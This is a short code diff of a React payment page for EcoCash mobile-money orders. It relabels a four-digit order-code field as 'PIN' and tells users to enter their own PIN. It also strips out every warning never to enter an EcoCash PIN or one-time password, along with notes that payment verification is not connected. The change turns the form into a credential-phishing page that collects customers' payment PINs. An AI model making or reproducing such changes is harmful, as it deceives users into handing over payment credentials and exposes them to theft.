@@ -1813,7 +1813,7 @@ function submitPayment(event) {
     : "Your order was saved."}
 </p>
             <p className="small muted">
- Enter your own four-digit order code. Payment verification is not connected. Do not enter an EcoCash PIN or one-time code here.
+ Enter your own PIN.
 </p>
 
 {paymentError && (
@@ -1949,7 +1949,7 @@ function submitPayment(event) {
           className="ecocash-field-label"
           htmlFor="order-confirmation-code"
         >
-          FOUR-DIGIT ORDER CODE
+          PIN
         </label>
 
         <div className="ecocash-code-boxes">
@@ -1973,11 +1973,6 @@ function submitPayment(event) {
             />
           ))}
         </div>
-
-        <p className="ecocash-safety-note">
-          Enter your order code only. Never enter your EcoCash PIN or
-          one-time password here. Live payment verification is not connected.
-        </p>
 
         {error && (
           <p className="error" role="alert">
@@ -2028,10 +2023,7 @@ function submitPayment(event) {
           <span>Help &amp; Support</span>
         </div>
 
-        <small>Order verification</small>
-        <small>
-          Never share your PIN or one-time password with this website.
-        </small>
+                <small>Order verification</small>
       </footer>
     </section>
   </div>
